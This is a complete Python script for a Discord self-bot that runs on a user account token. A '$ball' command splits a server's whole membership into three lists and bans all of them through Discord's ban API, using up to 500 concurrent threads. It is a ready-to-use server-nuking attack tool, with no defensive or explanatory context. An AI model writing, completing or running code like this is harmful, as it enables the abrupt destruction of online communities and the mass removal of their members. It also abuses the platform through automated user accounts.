import discord,threading, requests,os
from threading import Thread
from discord.ext import commands
os.system('pip install discord.py==1.4')
prefix='$'
client = commands.Bot(command_prefix=prefix,self_bot=True)
token  = "yourtoken"
class RTM:
  def Ban(guild, member):
    headers = {
      'Authorization': token,
      
    }
    json = {'reason': 'leaked'}
    r = requests.put(f'https://discord.com/api/v9/guilds/{guild}/bans/{member}', headers=headers,json=json)
    if r.status_code==204:
      print(f'{member} banned')
    else:
      print(f'{member} not banned')
      
@client.command()
async def ball(ctx):
  total = ctx.guild.member_count
  members_per_arrary = round(total/3)
  members_1= []
  members_2= []
  members_3= []
  for member in ctx.guild.members:
    if len(members_1) != members_per_arrary:
      members_1.append(member.id)
    elif len(members_2) != members_per_arrary:
      members_2.append(member.id)
    elif len(members_3) != members_per_arrary:
      members_3.append(member.id)
  print(f"w {members_1}\n{members_2}\n{members_3}")
  num = 0
  num1 = 0
  num2 = 0
  while True:
    try:
      if threading.active_count() <= 500:
        Thread(target=RTM.Ban, args=(ctx.guild.id, members_1[num])).start()
        num += 1
        Thread(target=RTM.Ban, args=(ctx.guild.id, members_2[num1])).start()
        num1+= 1
        Thread(target=RTM.Ban, args=(ctx.guild.id, members_3[num2])).start()
        num2 += 1
    except IndexError as h:
      break
    except Exception as e:
      pass
client.run(token, bot=False)
